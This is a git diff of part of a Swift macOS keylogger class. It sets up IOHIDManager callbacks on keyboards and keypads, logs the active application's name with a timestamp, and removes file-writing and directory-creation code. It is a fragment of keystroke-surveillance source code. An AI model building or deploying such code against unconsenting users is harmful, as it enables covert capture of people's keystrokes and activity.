@@ -27,25 +27,7 @@ class Keylogger
         devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
         
-        if !(FileManager.default.fileExists(atPath: appData.path) && FileManager.default.fileExists(atPath: keyData.path))
-        {
-            do
-            {
-                try FileManager.default.createDirectory(at: bundlePathURL.appendingPathComponent("Data"), withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: appData, withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: keyData, withIntermediateDirectories: false, attributes: nil)
-                try FileManager.default.createDirectory(at: devicesData, withIntermediateDirectories: false, attributes: nil)
-            }
-            catch
-            {
-                print("Can't create directories!")
-            }
-        }
-        if (CFGetTypeID(manager) != IOHIDManagerGetTypeID())
-        {
-            print("Can't create manager")
-            exit(1);
-        }
+
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keyboard)) as NSArray
         deviceList = deviceList.adding(CreateDeviceMatchingDictionary(inUsagePage: kHIDPage_GenericDesktop, inUsage: kHIDUsage_GD_Keypad)) as NSArray
         
@@ -61,12 +43,12 @@ class Keylogger
                                                           name: NSWorkspace.didActivateApplicationNotification,
                                                           object: nil)
         /* Connected and Disconnected Call Backs */
-        IOHIDManagerRegisterDeviceMatchingCallback(manager, IOHIDCallbackFunction.Handle_DeviceMatchingCallback, observer)
+        IOHIDManagerRegisterDeviceMatchingCallback(manager, CallBackFunctions.Handle_DeviceMatchingCallback, observer)
         
-        IOHIDManagerRegisterDeviceRemovalCallback(manager, IOHIDCallbackFunction.Handle_DeviceRemovalCallback, observer)
+        IOHIDManagerRegisterDeviceRemovalCallback(manager, CallBackFunctions.Handle_DeviceRemovalCallback, observer)
         
         /* Input value Call Backs */
-        IOHIDManagerRegisterInputValueCallback(manager, IOHIDCallbackFunction.Handle_IOHIDInputValueCallback, observer);
+        IOHIDManagerRegisterInputValueCallback(manager, CallBackFunctions.Handle_IOHIDInputValueCallback, observer);
         
         /* Open HID Manager */
         let ioreturn: IOReturn = openHIDManager()
@@ -79,36 +61,16 @@ class Keylogger
     
     @objc dynamic func activatedApp(notification: NSNotification)
     {
+//        print(notification.userInfo);
+        
         if  let info = notification.userInfo,
             let app = info[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
             let name = app.localizedName
         {
             self.appName = name
-            
-//            let dateFolder = "\(IOHIDCallbackFunction.calander.component(.day, from: Date()))-\(CallBackFunctions.calander.component(.month, from: Date()))-\(CallBackFunctions.calander.component(.year, from: Date()))"
-//            let path = self.appData.appendingPathComponent(dateFolder)
-//            if !FileManager.default.fileExists(atPath: path.path)
-//            {
-//                do
-//                {
-//                    try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
-//                }
-//                catch
-//                {
-//                    print("Can't Create Folder")
-//                }
-//            }
-//
-//            let fileName = path.appendingPathComponent("Time Stamps of Apps").path
-//            if !FileManager.default.fileExists(atPath: fileName )
-//            {
-//                if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
-//                {
-//                    print("Can't Create File!")
-//                }
-//            }
-//            let fh = FileHandle.init(forWritingAtPath: fileName)
-//            fh?.seekToEndOfFile()
+            //print(name);
+            //NSLog("%@", info);
+
             let timeStamp = Date().description(with: Locale.current) +  "\t\(self.appName)" + "\n"
 //            fh?.write(timeStamp.data(using: .utf8)!)
             print(timeStamp.data(using: .utf8)!)
